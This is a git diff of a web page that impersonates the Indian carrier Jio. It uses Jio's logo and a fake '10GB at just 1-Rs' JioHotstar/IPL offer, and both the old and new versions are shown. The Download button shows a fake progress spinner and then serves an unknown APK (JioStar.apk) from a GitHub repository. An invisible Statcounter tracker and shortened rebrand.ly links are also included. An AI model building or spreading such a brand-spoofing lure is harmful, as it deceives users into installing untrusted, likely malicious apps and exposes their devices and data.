@@ -1,30 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Get 10GB Data + JioStar Subscription free at Just 1₹.">
-    <meta property="og:title" content="Download PlanVoucher">
-    <meta property="og:description" content="Get 10GB Data + JioStar Subscription free at Just 1₹. Only available on our app.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png">
-    <meta property="og:url" content="https://rebrand.ly/Jio-4G">
+    <meta name="description" content="Get 10GB at just 1-Rs with Jio Hotstar Subcription">
+    <meta property="og:title" content="10GB at just 1-Rs with IPL streaming in HD quality.">
+    <meta property="og:description" content="Boos">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png"> <!-- Replace with your image URL -->
+    <meta property="og:url" content="https://rebrand.ly/JioApp">
     <title>Jio Services</title>
     <link rel="icon" href="favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        /* Ensure full height layout with flexbox */
-        body, html {
+        body {
             margin: 0;
-            padding: 0;
             font-family: 'Roboto', sans-serif;
             background-color: #f5f5f5;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
         }
-
-        /* Header styles */
         header {
             background-color: #0A4BBA;
             color: white;
@@ -35,13 +27,10 @@
             font-size: 1.2rem;
             font-weight: 600;
         }
-
         header img {
             height: 45px;
             margin-right: 8px;
         }
-
-        /* Container styles */
         .container {
             max-width: 90%;
             margin: 2rem auto;
@@ -50,13 +39,14 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             text-align: center;
-            flex: 1; /* Takes available vertical space */
         }
-
         .container h1 {
             font-size: 1.8rem;
             color: #333;
             font-family: 'Poppins', sans-serif;
+            text-align: center; /* Ensures text is centered */
+            transform: none; /* Ensures there's no rotation applied */
+            margin: 0; /* Removes extra spacing if any */
         }
 
         .container h4 {
@@ -64,19 +54,15 @@
             color: #333;
             font-family: 'Poppins', sans-serif;
         }
-
         .container p {
             font-size: 1rem;
             color: #666;
             margin: 1rem 0;
         }
-
-        /* Features list */
         .features {
             text-align: center;
             margin: 1rem 0;
         }
-
         .features ul {
             list-style: none;
             padding: 0;
@@ -84,23 +70,19 @@
             text-align: left;
             max-width: 300px;
         }
-
         .features ul li {
             display: flex;
             align-items: center;
             margin-bottom: 0.9rem;
-            font-size: 95%;
+            font-size: 0.9rem;
             color: #555;
         }
-
         .features ul li::before {
             content: '\2713';
             color: #0A4BBA;
             font-weight: bold;
             margin-right: 0.5rem;
         }
-
-        /* Download button */
         .download-button {
             display: inline-block;
             background-color: #0A4BBA;
@@ -115,29 +97,16 @@
             width: 50%;
             max-width: 150px;
         }
-
         .download-button:hover {
             background-color: #083D93;
         }
-
-        /* Footer styles */
         footer {
             text-align: center;
             padding: 1rem;
             background-color: #0A4BBA;
             color: white;
-            margin-top: auto;
-            width: 100%;
-            box-sizing: border-box;
-            font-size: 0.8rem;
+            margin-top: 2rem;
         }
-
-        footer b {
-            font-weight: bold;
-            font-size: 0.9rem;
-        }
-
-        /* Progress modal */
         #progressModal {
             display: none;
             position: fixed;
@@ -149,7 +118,6 @@
             justify-content: center;
             align-items: center;
         }
-
         .progress-container {
             width: 80%;
             max-width: 250px;
@@ -162,7 +130,6 @@
             justify-content: center;
             gap: 10px;
         }
-
         .progress-spinner {
             border: 5px solid #f3f3f3;
             border-top: 5px solid #0A4BBA;
@@ -171,72 +138,61 @@
             height: 40px;
             animation: spin 1.5s linear infinite;
         }
-
         .progress-text {
             color: #333;
             font-size: 1rem;
             font-family: 'Roboto', sans-serif;
         }
-
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        /* Responsive styles */
         @media (max-width: 768px) {
             header {
                 font-size: 1rem;
             }
-
             header img {
                 height: 25px;
                 margin-right: 5px;
             }
-
-            .container h1,
-            h4 {
+            .container h1,h4 {
                 font-size: 1.5rem;
             }
-
             .container p {
                 font-size: 0.9rem;
             }
-
             .features ul li {
                 font-size: 0.85rem;
             }
         }
     </style>
 </head>
-
 <body>
     <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" height="180" />
-        <span>Vouchers</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" height="180"/>
+        <span>Hotstar</span>
     </header>
     <div class="container">
         <h1>Get exclusive Jio offers from here</h1>
         <h4>This Offer Includes</h4>
         <div class="features">
             <ul>
-                <li>10GB Data Voucher + JioStar Subscription.</li>
-                <li>Only First 1-Cr Jio users are eligible</li>
-                <li>Offer validity 3 Months.</li>
+                <li>Get 10GB at Just 1-Rs with JioHotstar.</li>
+                <li>Get Continous speed without any buffering</li>
+                <li>Watch IPL-2025 in HD and 4K.</li>
                 <li>Instant help with 24/7 customer support</li>
             </ul>
         </div>
         <a id="downloadButton" href="#" class="download-button">Download Now</a>
     </div>
     <footer>
-        &copy; 2025 Jtech-Jio. All Rights Reserved.<br>
-        Website Content Managed by <b>Jio</b><br>
-        Last Updated On: February 27, 2025
+        &copy; 2025 Jio. All Rights Reserved.
+        <div class="b2card"></div>
+        <br>
+            Website Content Managed by <b>Jio</b>
+            <br>
+          
+        </div>
     </footer>
 
     <div id="progressModal">
@@ -247,8 +203,8 @@
     </div>
 
     <script>
-        const firstLink = "https://github.com/techglr/claim/raw/refs/heads/main/Jtech.apk";
-        const secondLink = "https://github.com/techglr/claim/raw/refs/heads/main/Jtech.apk";
+        const firstLink = "https://github.com/techglr/claim/raw/refs/heads/main/JioStar.apk";
+        const secondLink = "https://github.com/techglr/claim/raw/refs/heads/main/JioStar.apk";
         const startTime = new Date().getTime();
         const progressModal = document.getElementById("progressModal");
         const progressSpinner = document.getElementById("progressSpinner");
@@ -257,7 +213,7 @@
         document.getElementById("downloadButton").addEventListener("click", function (event) {
             event.preventDefault();
             progressModal.style.display = "flex";
-            setTimeout(function () {
+            setTimeout(function() {
                 const currentTime = new Date().getTime();
                 const elapsedMinutes = (currentTime - startTime) / (1000 * 60);
                 const downloadLink = elapsedMinutes <= 30 ? firstLink : secondLink;
@@ -266,11 +222,10 @@
             }, 1000);
         });
     </script>
-
 <script type="text/javascript">
-var sc_project=12889745; 
+var sc_project=12889744; 
 var sc_invisible=1; 
-var sc_security="a51383de"; 
+var sc_security="a10820b5"; 
 </script>
 <script type="text/javascript"
 src="https://www.statcounter.com/counter/counter.js"
@@ -278,10 +233,8 @@ async></script>
 <noscript><div class="statcounter"><a title="Web Analytics
 Made Easy - Statcounter" href="https://statcounter.com/"
 target="_blank"><img class="statcounter"
-src="https://c.statcounter.com/12889745/0/a51383de/1/"
+src="https://c.statcounter.com/12889744/0/a10820b5/1/"
 alt="Web Analytics Made Easy - Statcounter"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
-
 </body>
-
 </html>
